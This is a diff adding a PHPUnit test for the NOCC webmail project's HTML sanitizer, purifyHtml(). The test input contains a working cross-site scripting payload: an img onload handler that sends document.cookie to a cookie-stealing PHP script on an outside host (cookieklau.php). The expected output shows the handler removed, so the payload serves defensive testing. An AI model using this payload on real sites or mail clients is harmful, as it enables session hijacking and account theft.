@@ -184,6 +184,25 @@ class NOCC_SecurityTest extends PHPUnit_Framework_TestCase {
     }
 
     /**
+     * Test case for purifyHtml().
+     */
+    public function testPurifyHtml() {
+        $html =
+'Nun klaue ich Dir Dein Session Cookie!<br />&nbsp;<br />
+<img alt="test" src="cid:part1.07060002.08090408@hitco.at"
+  height="20" width="20"
+  onload="document.myIMG.src=\'http\'+\':\'+\'//\'+\'www.hitco.at/img/cookieklau.php?\'+document.cookie" />
+<img name="myIMG" src="cid:part1.07060002.08090408@hitco.at" height="20" width="800" /><br />';
+
+        $expected =
+'Nun klaue ich Dir Dein Session Cookie!<br />&nbsp;<br />
+<img alt="test" src="cid:part1.07060002.08090408@hitco.at" height="20" width="20" />
+<img src="cid:part1.07060002.08090408@hitco.at" height="20" width="800" alt="image" id="myIMG" /><br />';
+
+        $this->assertEquals($expected, NOCC_Security::purifyHtml($html));
+    }
+
+    /**
      * Test case for convertHtmlToPlainText().
      */
     public function testConvertHtmlToPlainText() {
